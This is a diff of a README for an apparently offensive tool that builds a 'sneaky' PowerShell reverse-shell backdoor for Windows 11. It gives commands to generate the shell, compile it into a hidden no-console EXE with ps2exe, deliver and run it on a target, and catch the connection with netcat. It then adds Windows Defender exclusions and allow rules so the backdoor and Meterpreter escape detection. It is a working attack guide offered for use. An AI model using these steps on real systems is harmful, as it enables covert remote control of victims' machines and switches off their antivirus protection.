@@ -6,7 +6,7 @@ This repository provides a tool to facilitate the creation and deployment of a s
 
 Before using this tool, ensure that you have the following:
 
-1. **Kali Linux:** Make sure you have Kali Linux installed, along with `msfconsole` and `msfvenom`.
+1. **Kali Linux:** Make sure you have Kali Linux installed, along with `msfconsole`, `msfvenom` and any web-server.
 2. **Windows 11:** You need a Windows 11 machine to create an executable file from PowerShell scripts (EXE). Wine may be an option, but it's not officially supported.
 3. **Target Windows 11:** The machine you intend to target.
 
@@ -14,36 +14,39 @@ Before using this tool, ensure that you have the following:
 
 These variables can be adjusted according to your environment. Use Ctrl + F to locate and modify them easily.
 
-```powershell
-$lhost = "192.168.0.2"           # IP address of your Kali host
-$lport = 4444                    # Listening port on your Kali
-$lport_sneaky = 5555             # Sneaky listening port on your Kali
-$lwebpath = "/var/www/html/"      # Path to the open website on your Kali
-$lwinpath = "C:\Users\w\"         # Working path on the Windows 11 target
-$lpath = "/home/k/Desktop/"       # Path to a local directory on your Kali
-$rpath = "C:\Users\w\Desktop\"    # Working path on the attacking host
-$ps_name = "reverse_shell.ps1"    # Name of your Meterpreter reverse shell PowerShell file
-$exe_name = "reverse_shell.exe"   # Name of your attacking sneaky reverse shell executable file
+```variables
+$lhost = "192.168.0.2"                        # IP address of your Kali host
+$lport = 4444                                 # Listening port on your Kali
+$lport_sneaky = 5555                          # Sneaky listening port on your Kali
+$lwebpath = "/var/www/html/"                  # Path to the open website on your Kali
+$lwinpath = "C:\Users\w\"                     # Working path on the Windows 11 target
+$lpath = "/home/k/Desktop/"                   # Path to a local directory on your Kali
+$rpath = "C:\Users\w\Desktop\"                # Working path on the attacking host
+$ps_name = "reverse_shell.ps1"                # Name of your Meterpreter reverse shell PowerShell file
+$exe_name = "reverse_shell.exe"               # Name of your attacking sneaky reverse shell executable file
 $sneaky_exename = "sneaky_reverse_shell.exe"  # Name of your attacking sneaky reverse shell sneaky executable file
 $sneaky_psname = "sneaky_reverse_shell.ps1"   # Name of your sneaky reverse shell sneaky PowerShell file
 ```
 
 ## Usage
 
-1. Open a Kali Linux terminal and execute the following commands:
+# Kali Linux
+1. Press **Ctrl + Alt + t** for open a first Kali Linux terminal and execute **sudo su** and this following commands:
 
 ```bash
 cd $lpath
 git clone https://github.com/gh0x0st/Get-ReverseShell
 cd ./Get-ReverseShell
-pwsh
+```
+2. Write **pwsh** for open a PowerShell terminal and execute the following commands for create sneaky reverse shell script:
+```pwsh
 Import-Module ./get-reverseshell.ps1
 get-reverseshell -Ip $lhost -Port $lport_sneaky
 ```
 
-2. Write your script in the file `$lpath/$sneaky_psname` after appending ">> https://github.com/gh0x0st".
+3. Write your sneaky reverse shell script in the file `$lpath/$sneaky_psname` after line ">> https://github.com/gh0x0st".
 
-3. Continue with the following commands:
+4. Write **exit** and continue in first Kali Linux terminal with the following commands:
 
 ```bash
 exit
@@ -51,15 +54,11 @@ cp $sneaky_psname $lwebpath
 nc -nvlp 5555
 ```
 
-4. Clone Invoke-Obfuscation for obfuscating your PowerShell script:
-
-```bash
-git clone https://github.com/danielbohannon/Invoke-Obfuscation
-```
-
-5. Open a Windows 11 PowerShell with administrator privileges and run the following commands:
+# Windows 11
+1. Open a Windows 11 PowerShell with administrator privileges and run the following commands:
 
 ```powershell
+Set-ExecutionPolicy Bypass
 Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false -ErrorAction SilentlyContinue
 Install-Module -Name ps2exe -Force -Confirm:$false -ErrorAction SilentlyContinue
 @"
@@ -72,15 +71,36 @@ Invoke-Expression -Command `$scriptContent
 Invoke-ps2exe $lwinpath$sneaky_psname $lwinpath$sneaky_exename -noconsole -noerror -nooutput -sta -x64
 ```
 
-6. Execute the sneaky backdoor on the target machine with administrator privileges.
+2. Send and execute the sneaky backdoor on the target machine with administrator privileges.
 
-7. Return to the Kali terminal and check for a successful connection:
+# Return to the Kali Linux
+
+6. Return to the Kali terminal and check for a successful connection. You should see somesthing like that:
 
 ```bash
-nc -nvlp 5555
+┌──(root㉿kali)-[/home/k/Desktop]
+└─# nc -nvlp 5555
+listening on [any] 5555 ...
+connect to [192.168.0.2] from (UNKNOWN) [192.168.0.20] 62074
+                                                                                                                                                                                                                                            
+PS C:\Users\w\Desktop>
 ```
 
-8. If successful, you can proceed with further commands in the Meterpreter shell.
+7. If successful, you can proceed with further commands in the sneaky reverse shell for allow Meterpreter Reverse Shell and expand backdoor.
+```powershell
+Set-ExecutionPolicy Bypass
+Add-MpPreference -ExclusionProcess "cmd.exe"
+Add-MpPreference -ThreatIDDefaultAction_Ids @(2147735445) -ThreatIDDefaultAction_Actions @('Allow')
+Add-MpPreference -ExclusionExtension @("exe", "dll", "ps1", "vbs")
+Add-MpPreference -ExclusionPath '$rpath$sneaky_exename'
+Add-MpPreference -ExclusionProcess "$sneaky_exename"
+```
+
+
+8. Checkout Windows Defender rules via this command
+```powershell
+Get-MpPreference
+```
 
 ## Meterpreter Reverse Shell
 
